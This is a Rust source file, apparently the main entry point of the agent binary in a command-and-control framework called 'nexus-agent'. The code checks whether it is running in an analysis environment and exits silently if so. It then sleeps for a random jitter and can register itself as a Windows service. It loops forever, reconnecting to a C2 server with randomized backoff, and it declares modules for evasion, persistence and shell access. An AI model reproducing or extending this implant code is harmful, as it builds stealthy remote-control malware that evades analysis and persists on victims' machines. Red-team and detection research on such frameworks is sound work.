// v1.4 commit-prep: the nexus-agent binary is a v1.0 overlay that
// pre-dates the `-D warnings` CI gate. Suppress the accumulated
// dead-code + unused-import patterns at the binary root so the gate
// doesn't block new work. The v1.5 overlay cleanup pass will address
// these properly.
#![allow(
    dead_code,
    unused_imports,
    unused_variables,
    unused_mut,
    ambiguous_glob_imports,
    clippy::all
)]

use nexus_common::*;
use std::env;
use std::sync::Arc;
use std::time::Duration;
use tokio::time::sleep;

mod a2a_client;
mod agent;
mod communication;
mod evasion;
mod execution;
mod persistence;
mod registry;
mod shell;
mod system;

#[cfg(target_os = "windows")]
mod fiber_execution;

#[cfg(target_os = "windows")]
mod svc;

use agent::NexusAgent;
use communication::NetworkClient;
use evasion::EnvironmentChecker;

fn main() {
    let args: Vec<String> = env::args().collect();

    // Handle service subcommands synchronously before any async runtime is
    // constructed.  --run-service is invoked by the SCM and must call
    // service_dispatcher::start() on the main thread without a live Tokio
    // runtime above it.
    #[cfg(target_os = "windows")]
    match args.get(1).map(|s| s.as_str()) {
        Some("--install") => {
            if let Err(e) = svc::install() {
                eprintln!("[nexus-agent] install failed: {}", e);
                std::process::exit(1);
            }
            return;
        }
        Some("--uninstall") => {
            if let Err(e) = svc::uninstall() {
                eprintln!("[nexus-agent] uninstall failed: {}", e);
                std::process::exit(1);
            }
            return;
        }
        Some("--run-service") => {
            if let Err(e) = svc::run() {
                eprintln!("[nexus-agent] service dispatcher failed: {}", e);
                std::process::exit(1);
            }
            return;
        }
        _ => {}
    }

    // Standard foreground agent path.
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .expect("failed to build tokio runtime");

    if let Err(e) = rt.block_on(run_agent(args)) {
        #[cfg(debug_assertions)]
        eprintln!("Agent error: {}", e);
    }
}

async fn run_agent(args: Vec<String>) -> Result<()> {
    // Always initialize tracing — the service needs visible logs.
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info")),
        )
        .with_target(false)
        .init();

    if EnvironmentChecker::is_analysis_environment().await {
        return Ok(());
    }

    let jitter = rand::random::<u64>() % 30 + 10;
    sleep(Duration::from_secs(jitter)).await;

    // Prefer NEXUS_SERVER_ADDR env var; fall back to first CLI arg.
    let c2_addr = std::env::var("NEXUS_SERVER_ADDR").unwrap_or_else(|_| {
        args.get(1)
            .cloned()
            .unwrap_or_else(|| "https://127.0.0.1:50052".to_string())
    });
    let tag = std::env::var("NEXUS_AGENT_TAG").unwrap_or_default();
    // NEXUS_INSECURE_NETWORK bypasses the loopback gate without TLS — dev/test only.
    // In production, set NEXUS_CA_CERT instead; that satisfies the gate via TLS.
    let insecure_network = std::env::var("NEXUS_INSECURE_NETWORK").is_ok();

    let cfg = a2a_client::A2aClientConfig { c2_addr, tag, insecure_network };

    let identity_path = std::env::var("NEXUS_IDENTITY_PATH")
        .unwrap_or_else(|_| "/var/lib/nexus-agent/identity.bin".to_string());
    let identity = NodeIdentity::load_or_create(std::path::Path::new(&identity_path))?;
    tracing::info!(peer_id = %hex_peer_id(identity.peer_id()), "identity loaded");

    loop {
        tracing::info!(addr = %cfg.c2_addr, "connecting to C2");
        match a2a_client::connect_and_serve(&cfg, &identity, std::future::pending::<()>()).await {
            Ok(()) => {
                tracing::info!("C2 stream closed cleanly, reconnecting");
            }
            Err(e) => {
                tracing::warn!("C2 connect error: {e}, backing off");
                let delay = rand::random::<u64>() % 300 + 60;
                sleep(Duration::from_secs(delay)).await;
            }
        }
    }
}

fn hex_peer_id(peer_id: [u8; 32]) -> String {
    peer_id.iter().map(|b| format!("{b:02x}")).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_agent_initialization() {
        let server_addr = "127.0.0.1:4444".to_string();
        let key = [0u8; 32];

        // This should not panic
        let agent = NexusAgent::new(server_addr, key).await;
        assert!(agent.is_ok());
    }
}
